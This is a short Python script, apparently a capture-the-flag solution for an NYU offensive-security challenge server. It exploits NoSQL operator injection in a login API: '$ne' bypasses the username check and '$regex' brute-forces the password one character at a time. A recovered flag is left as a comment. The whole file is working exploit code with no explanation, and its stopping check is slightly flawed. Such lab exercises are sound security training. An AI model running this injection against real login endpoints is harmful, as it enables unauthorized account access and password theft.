import requests

url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:10000'
headers = {"Content-Type": "application/json"}

charset = "_{}0123456789abcdefghijklmnopqrstuvwxyz"
password = ""

print("[*] Starting password recovery...")
while True:
    for char in charset:
        attempt = password + char
        data = {
            'username': {"$ne": ""},
            'password': {"$regex": f"^{attempt}"}
        }

        response = requests.post(f'{url}/api/login', json=data, headers=headers)
        response_json_data = response.json()

        if response_json_data.get("authenticated"):
            password += char
            print(f"[+] Password found so far: {password}")
            break

    if not any(response.json().get("authenticated") for char in charset):
        print(f"[+] Full password found: {password}")
        break

# flag{n0_w4y_y0u_f0und_sup3r_s3cr3t_p4ssw0rd_n0w_try_t0_h4ck_n4s4_0000000000000000}
